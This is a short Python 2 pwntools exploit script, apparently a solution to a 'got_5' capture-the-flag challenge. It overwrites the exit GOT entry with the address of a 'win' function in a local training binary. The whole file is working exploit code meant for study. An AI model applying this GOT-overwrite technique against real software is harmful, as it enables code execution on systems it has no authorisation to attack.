from pwn import *


def start():
    global sh
    stdout = process.PTY
    stdin = process.PTY
    sh = process(argv=['/problems/got_5_c5119617c90aa544a639812dbc41e24e/vuln'], stdin=stdin, stdout=stdout)

def _sendlineafter(term, inp):
    print sh.recvuntil(term)
    print inp
    sh.sendline(inp)
win = 0x080485c6
main = 0x0804865f
exit = 0x804a01c

payload1 = str(exit)
payload2 = str(win)

def test(guess):
    start()
    _sendlineafter("s\n", payload1)
    _sendlineafter("?\n", payload2)
    output = sh.recvall()
    print output

test(None)
#print payload1 + '\n' + payload2
#while not test(None)
